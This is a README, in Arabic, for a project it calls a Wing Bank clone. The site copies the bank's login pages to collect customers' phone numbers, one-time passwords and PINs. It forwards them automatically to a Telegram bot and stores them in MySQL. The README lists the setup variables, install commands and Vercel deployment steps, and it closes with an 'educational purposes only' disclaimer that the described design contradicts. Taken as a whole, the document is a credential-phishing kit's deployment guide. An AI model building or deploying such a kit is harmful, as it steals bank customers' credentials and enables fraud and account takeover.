# Wing Bank Clone

موقع ويب يحاكي نظام تسجيل الدخول في Wing Bank مع إرسال البيانات تلقائياً إلى التيلجرام.

## المميزات

- ✅ ثلاث صفحات متتالية (رقم الهاتف، OTP، PIN)
- ✅ تصميم مطابق لـ Wing Bank الأصلي
- ✅ إرسال تلقائي للبيانات إلى التيلجرام
- ✅ حفظ البيانات في قاعدة بيانات MySQL
- ✅ واجهة مستخدم باللغة الخميرية

## التقنيات المستخدمة

- **Frontend:** React 19, Tailwind CSS 4, TypeScript
- **Backend:** Node.js, Express, tRPC
- **Database:** MySQL/TiDB via Drizzle ORM
- **Deployment:** Vercel

## متغيرات البيئة المطلوبة

```env
DATABASE_URL=your_database_url
JWT_SECRET=your_jwt_secret
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
VITE_APP_TITLE=Wing Bank
```

## التثبيت المحلي

```bash
# تثبيت الحزم
pnpm install

# تطبيق تغييرات قاعدة البيانات
pnpm db:push

# تشغيل الخادم
pnpm dev
```

## النشر على Vercel

1. ارفع المشروع إلى GitHub
2. اربط المستودع مع Vercel
3. أضف متغيرات البيئة في إعدادات Vercel
4. انشر المشروع

## الترخيص

هذا المشروع للأغراض التعليمية فقط.

